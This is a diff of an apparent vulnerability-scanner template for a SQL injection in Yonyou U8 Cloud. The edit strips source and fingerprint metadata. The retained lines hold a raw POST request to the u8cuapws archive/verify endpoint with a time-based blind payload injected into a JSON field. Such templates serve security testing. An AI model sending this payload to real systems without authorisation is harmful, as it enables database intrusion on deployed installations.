@@ -3,14 +3,8 @@ info:
   name: 用友U8 Cloud U8cuapws SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gi26w9kf2vnq4lgl
-
-    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gi26w9kf2vnq4lgl
-    fofa: ZoomEye语法 app:"用友U8 Cloud"
 http:
 - raw:
   - 'POST /u8cuapws/rest/archive/verify HTTP/1.1
@@ -44,8 +38,6 @@ http:
 
 
     Content-Type: application/x-www-form-urlencoded
-
-
 
 
     {"orgInfo":{"code":"1'';WAITFOR DELAY ''0:0:5''--"}}
